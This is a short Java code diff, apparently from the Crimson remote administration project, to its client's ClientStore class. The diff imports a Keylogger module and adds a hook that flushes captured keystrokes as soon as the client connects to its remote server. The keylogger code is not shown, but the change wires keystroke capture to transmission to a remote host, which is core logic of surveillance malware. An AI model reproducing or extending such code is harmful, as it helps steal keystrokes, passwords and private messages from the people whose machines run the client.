@@ -25,6 +25,7 @@ import java.util.List;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.net.ClientConnector;
 import com.subterranean_security.crimson.core.fm.LocalFilesystem;
 import com.subterranean_security.crimson.core.net.ConnectionState;
@@ -81,6 +82,7 @@ public final class ClientStore {
 							log.debug("Attempting connection to: {}:{}", n.getServer(), n.getPort());
 							ClientConnector connector = new ClientConnector(n.getServer(), n.getPort());
 							add(0, connector);
+							connectionEstablishedHook();
 							return;
 
 						} catch (ConnectException e) {
@@ -96,6 +98,10 @@ public final class ClientStore {
 				connecting = false;
 			}
 
+		}
+
+		private static void connectionEstablishedHook() {
+			Keylogger.flush();
 		}
 
 		public static void route(Message m) {
